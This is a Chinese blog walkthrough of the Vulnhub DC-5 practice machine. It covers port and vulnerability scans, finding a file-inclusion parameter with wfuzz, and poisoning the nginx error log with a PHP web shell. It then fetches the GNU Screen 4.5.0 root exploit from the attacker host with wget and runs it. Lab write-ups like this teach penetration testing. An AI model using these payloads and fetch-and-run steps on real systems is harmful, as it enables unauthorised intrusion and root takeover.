---
layout: config.default_layout
title: Vulnhub-DC-5
date: 2025-04-02 15:36:42
updated: 2025-04-02 15:36:45
comments: true
tags: [Vulnhub]
categories: 靶机
---

# DC-5

> https://www.vulnhub.com/entry/dc-5,314/
> 

## 主机发现端口扫描

1. 探测存活主机，`175`是靶机
    
    ```php
    nmap -sP 192.168.75.0/24
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 13:27 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00022s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00018s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.175
    Host is up (0.00016s latency).
    MAC Address: 00:0C:29:BF:7F:5F (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00015s latency).
    MAC Address: 00:50:56:FE:CA:7A (VMware)
    Nmap scan report for 192.168.75.151
    Host is up.
    ```
    
2. 扫描靶机所有开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.175
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 13:28 CST
    Nmap scan report for 192.168.75.175
    Host is up (0.00040s latency).
    Not shown: 65532 closed tcp ports (conn-refused)
    PORT      STATE SERVICE
    80/tcp    open  http
    111/tcp   open  rpcbind
    57203/tcp open  unknown
    MAC Address: 00:0C:29:BF:7F:5F (VMware)
    ```
    
3. 扫描服务版本及系统版本
    
    ```php
    nmap -sV -sT -O -p80,111,57203 192.168.75.175
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 13:30 CST
    Nmap scan report for 192.168.75.175
    Host is up (0.00047s latency).
    
    PORT      STATE SERVICE VERSION
    80/tcp    open  http    nginx 1.6.2
    111/tcp   open  rpcbind 2-4 (RPC #100000)
    57203/tcp open  status  1 (RPC #100024)
    MAC Address: 00:0C:29:BF:7F:5F (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80,111,57203 192.168.75.175
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 13:33 CST
    Nmap scan report for 192.168.75.175
    Host is up (0.00052s latency).
    
    PORT      STATE SERVICE
    80/tcp    open  http
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-csrf:
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.175
    |   Found the following possible CSRF vulnerabilities:
    |
    |     Path: http://192.168.75.175:80/contact.php
    |     Form id: fname
    |_    Form action: thankyou.php
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    111/tcp   open  rpcbind
    57203/tcp open  unknown
    MAC Address: 00:0C:29:BF:7F:5F (VMware)
    ```
    
    没什么实质性信息，依旧是80端口开始
    

## web渗透

1. 访问主页
    
    ![image.png](image30.png)
    
2. 扫描目录，没什么可以关注的
    
    ```python
    dirsearch -u 192.168.75.175 -x 403
    //
    [13:40:35] Starting:
    [13:40:56] 200 -    4KB - /contact.php
    [13:40:56] 301 -  184B  - /css  ->  http://192.168.75.175/css/
    [13:41:00] 200 -    6KB - /faq.php
    [13:41:01] 200 -   17B  - /footer.php
    [13:41:03] 301 -  184B  - /images  ->  http://192.168.75.175/images/
    [13:41:25] 200 -  852B  - /thankyou.php
    ```
    
3. 我们看官网下的小提示：这个特定的入口点可能很难识别，但它确实存在。您需要寻找一些不寻常的东西（刷新页面时会发生变化的东西），我们可以注意到每次提交`footer`页面的年份就会不一样
    
    ![image.png](image31.png)
    
    可能入口就存在页脚里
    
4. 访问`/footer.php` ，一直刷新年份也会变，所以就是`thankyou`页面包含了`footer.php` ,可能存在参数来包含`footer.php` ,使用`wfuzz`来尝试混淆出参数
    
    ```python
    # 尝试包含 /etc/passwd
    wfuzz -c -w /usr/share/wfuzz/wordlist/general/big.txt --hh 851 'http://192.168.75.175/thankyou.php?FUZZ=/etc/passwd'
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://192.168.75.175/thankyou.php?FUZZ=/etc/passwd
    Total requests: 3024
    
    =====================================================================
    ID           Response   Lines    Word       Chars       Payload
    =====================================================================
    
    000001053:   200        70 L     104 W      2319 Ch     "file"
    
    ```
    
    混淆出参数`file` ，可能就是使用`file` 参数来包含文件的，成功包含`/etc/passwd`
    
    ![image.png](image32.png)
    
5. 因为不存在登陆页面，所以包含了`/etc/passwd`文件也没用，根据`CTF`的思路我们尝试包含日志文件
    
    ```python
    /thankyou.php?file=/var/log/nginx/access.log
    ```
    
    包含成功！
    
6. 尝试后，`UA`插入`php`代码不成功。最后，我们可以将`php`代码插入到`file`参数后，使其发生错误，然后将该语句留在`error.log`里
    
    （这里开始靶机IP改为`176`，之前乱搞把之前的靶机搞坏了）
    
    ```python
    http://192.168.75.176/thankyou.php?file=<?php system($_POST['a']); ?>
    ```
    
    包含`error.log` ,存在`&lt;?php @eval($_POST['b']); ?&gt;` 即可
    
    ```python
    2024/11/03 04:37:36 [error] 557#0: *63 FastCGI sent in stderr: "PHP message: PHP Warning:  include(&lt;?php @eval($_POST['b']); ?&gt;): failed to open stream: No such file or directory in /var/www/html/thankyou.php on line 44
    PHP message: PHP Warning:  include(): Failed opening '&lt;?php @eval($_POST['b']); ?&gt;' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/html/thankyou.php on line 44" while reading response header from upstream, client: 192.168.75.1, server: _, request: "GET /thankyou.php?file= HTTP/1.1", upstream: "fastcgi://unix:/var/run/php5-fpm.sock:", host: "192.168.75.176", referrer: "http://192.168.75.176/thankyou.ph"
    ```
    
    使用蚁🗡连接（密码是`b`，取决以你的`post`参数），然后在蚁🗡里面启动终端然后反弹shell
    
    ![image.png](image33.png)
    

## 提权

1. 查看权限
    
    ```python
    (www-data:/var/www) $ whoami
    www-data
    (www-data:/var/www) $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    (www-data:/var/www) $ uname -a
    Linux dc-5 3.16.0-4-amd64 #1 SMP Debian 3.16.51-2 (2017-12-03) x86_64 GNU/Linux
    ```
    
2. 寻找敏感文件
    
    ```python
    (www-data:/var/www) $ find / -perm -u=s -type f 2>/dev/null
    /bin/su
    /bin/mount
    /bin/umount
    /bin/screen-4.5.0
    /usr/bin/gpasswd
    /usr/bin/procmail
    /usr/bin/at
    /usr/bin/passwd
    /usr/bin/chfn
    /usr/bin/newgrp
    /usr/bin/chsh
    /usr/lib/openssh/ssh-keysign
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/eject/dmcrypt-get-device
    /usr/sbin/exim4
    /sbin/mount.nfs
    ```
    
    发现`screen-4.5.0`
    
3. 搜索`screen-4.5.0` 是否存在提权漏洞
    
    ```python
    searchsploit screen 4.5.0
    ------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                                                                                   |  Path
    ------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    GNU Screen 4.5.0 - Local Privilege Escalation                                                                                                    | linux/local/41154.sh
    GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                                              | linux/local/41152.txt
    ------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    ```
    
    将`linux/local/41154.sh` 拿去下来下载到靶机
    
4. 执行脚本
    
    ```python
    $ wget http://192.168.75.151/41154.sh
    converted 'http://192.168.75.151/41154.sh' (ANSI_X3.4-1968) -> 'http://192.168.75.151/41154.sh' (UTF-8)
    --2024-11-03 05:11:00--  http://192.168.75.151/41154.sh
    Connecting to 192.168.75.151:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 1149 (1.1K) [application/x-sh]
    Saving to: '41154.sh'
    
    41154.sh            100%[=====================>]   1.12K  --.-KB/s   in 0s
    
    2024-11-03 05:11:00 (8.86 MB/s) - '41154.sh' saved [1149/1149]
    //
    $ chmod u+x 41154.sh
    //
    $ ./41154.sh
    ~ gnu/screenroot ~
    [+] First, we create our shell and library...
    [+] Now we create our /etc/ld.so.preload file...
    [+] Triggering...
    ' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
    [+] done!
    No Sockets found in /tmp/screens/S-www-data.
    
    # id
    id
    uid=0(root) gid=0(root) groups=0(root),33(www-data)
    # whoiam
    whoiam
    sh: 2: whoiam: not found
    # whoami
    whoami
    root
    ```
    
    提权成功，读取`flag`文件
    
    ```python
    # cat thisistheflag.txt
    cat thisistheflag.txt
    
    888b    888 d8b                                                      888      888 888 888
    8888b   888 Y8P                                                      888      888 888 888
    88888b  888                                                          888      888 888 888
    888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888
    888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888
    888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P
    888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "
    888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888
    
    Once again, a big thanks to all those who do these little challenges,
    and especially all those who give me feedback - again, it's all greatly
    appreciated.  :-)
    
    I also want to send a big thanks to all those who find the vulnerabilities
    and create the exploits that make these challenges possible.
    
    ```